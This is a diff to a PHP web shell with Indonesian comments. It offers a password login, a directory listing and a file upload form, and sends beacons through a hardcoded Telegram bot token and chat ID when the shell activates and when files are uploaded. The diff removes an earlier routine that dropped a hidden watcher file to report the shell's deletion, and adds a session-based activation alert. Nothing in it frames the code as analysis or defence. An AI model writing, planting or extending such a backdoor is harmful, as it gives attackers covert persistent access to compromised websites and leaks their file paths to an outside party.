@@ -1,8 +1,8 @@
 <?php
 session_start();
 
-// ================= CONFIG =================
 $passHash = '$2a$12$qbUBAVBufBYtIT9KbYq2VeSywq/9N8gXUyETmsOe8dHnxBjXsN.0O';
+
 $token = "8687462257:AAEzX81PQXglaSAcKi2pz1zg01Kb-XXBOQ4";
 $chat_id = "8259867883";
 
@@ -11,26 +11,12 @@ function sendTele($msg, $token, $chat_id) {
     @file_get_contents("https://api.telegram.org/bot".$token."/sendMessage?chat_id=".$chat_id."&text=".urlencode($msg));
 }
 
-// ================= NOTIF PASANG =================
-if (!file_exists(__DIR__.'/.install_log')) {
+// ================= NOTIF SAAT AKTIF =================
+if (!isset($_SESSION['notif'])) {
 
-    file_put_contents(__DIR__.'/.install_log', 'ok');
+    sendTele("🔥 FILE AKTIF\n".__FILE__, $token, $chat_id);
 
-    sendTele("🔥 FILE TERPASANG\n".__FILE__, $token, $chat_id);
-
-    // AUTO BUAT WATCHER
-    $watch = '<?php
-$token="'.$token.'";
-$chat_id="'.$chat_id.'";
-$target="'.__FILE__.'";
-
-if (!file_exists($target)) {
-    file_get_contents("https://api.telegram.org/bot".$token."/sendMessage?chat_id=".$chat_id."&text=⚠️ FILE DIHAPUS");
-    unlink(__FILE__);
-}
-?>';
-
-    file_put_contents(__DIR__.'/.watch_'.md5(__FILE__).'.php', $watch);
+    $_SESSION['notif'] = true;
 }
 
 // ================= LOGIN =================
@@ -79,7 +65,7 @@ if (isset($_FILES['f'])) {
 
         echo "<p>✅ Upload sukses</p>";
 
-        sendTele("📤 FILE UPLOAD\n$name", $token, $chat_id);
+        sendTele("📤 UPLOAD\n$name", $token, $chat_id);
 
     } else {
         echo "<p>❌ Upload gagal</p>";
@@ -102,7 +88,6 @@ if (!empty($_SESSION['history'])) {
 
 echo "<br><br>";
 
-echo "<ul>";
 foreach (scandir($current) as $f) {
     if ($f == '.' || $f == '..') continue;
     $full = $current . '/' . $f;
@@ -113,7 +98,6 @@ foreach (scandir($current) as $f) {
         echo "📄 $f<br>";
     }
 }
-echo "</ul>";
 
 echo '<form method="post" enctype="multipart/form-data">
         <input type="file" name="f">
